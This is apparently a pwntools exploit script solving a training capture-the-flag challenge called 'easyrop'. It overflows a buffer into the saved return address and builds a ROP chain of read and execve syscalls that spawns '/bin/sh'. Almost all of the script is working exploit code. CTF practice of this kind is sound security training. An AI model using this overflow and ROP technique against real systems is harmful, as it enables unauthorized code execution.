from pwn import *

# Reads two times 4 bytes and sums them, saving the result on the next free space of a buffer.
# Goes on until the sum of read bytes (by the two reads) is <= 2 (practivally, until one sends \n\n).
# Two considerations:
#   + we can make the program read as we want, so we can overflow the buffer to the srip
#   + what is written inside the buffer is the integer sum of two 4-bytes reads, so:
#       - to fill a 64-bit word we need to read 4 times, so 2 cycles
#       - each 32-bit word is the sum of what we input in the previous two reads
#           => \n is evil, but we can send p32(0) after the needed address to make it stay as is

CHALL_PATH = "./easyrop"
COMMANDS = """
b main
b *main+231
c
"""

context.arch = "amd64"

NEWLINE = p32(0)
WRITE = b"\x00\x00\x00"
PREP_SYSCALL_REGS = p32(0x40108e)
LEN_LOCATION = p32(0x403000)
READ_COUNT = p32(8)
SYSCALL = p32(0x40107b)
EXECVE_CODE = p32(0x3b)

if args.REMOTE :
    c = remote("easyrop.training.offensivedefensive.it", 8080, ssl = True)
else :
    if args.GDB :
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else :
        c = process(CHALL_PATH)

c.recvuntil(b"Try easyROP!\n")

# send random stuff to overflow the buffer to the srip (writing at least 3 bytes every 2 read, otherwise program exits while loop)
for i in range(28) :
    c.send(NEWLINE)

    if i%2 == 1 :
        c.recvuntil(WRITE)

# insert in the rop chain the address of the gadget to pop parameters to set read
c.send(PREP_SYSCALL_REGS)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# 0 to put inside rdi for read fd (stdin)
c.send(NEWLINE)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# global var len location where to put inside "/bin/sh" (read buffer parameter)
c.send(LEN_LOCATION)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# 8 to put inside rdx for read byte count
c.send(READ_COUNT)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# 0x00 to put inside rax for syscall code (read)
c.send(NEWLINE)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# insert in the rop chain the address of the gadget to perform the read syscall
c.send(SYSCALL)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# 0 to compensate pop rbp after the syscall and before ret in the last gadget
c.send(NEWLINE)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# insert in the rop chain the address of the gadget to pop parameters to set execve
c.send(PREP_SYSCALL_REGS)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# "/bin/sh" location (global var len) to put inside rdi for execve name param
c.send(LEN_LOCATION)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# 0 to put inside rsi for execve argv
c.send(NEWLINE)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# 0 to put inside rdx for execve envp
c.send(NEWLINE)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# 0x3b to put inside rax for syscall code (execve)
c.send(EXECVE_CODE)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# insert in the rop chain the address of the gadget to perform the execve syscall
c.send(SYSCALL)
c.send(NEWLINE)
c.recvuntil(WRITE)
c.send(NEWLINE)
c.send(NEWLINE)

c.recvuntil(WRITE)

# exit while loop and return from main
c.sendline()
c.sendline()

c.recvuntil(WRITE)

# "/bin/sh" for the read syscall (to be put inside global var len)
c.sendline(b"/bin/sh\0")

c.interactive()
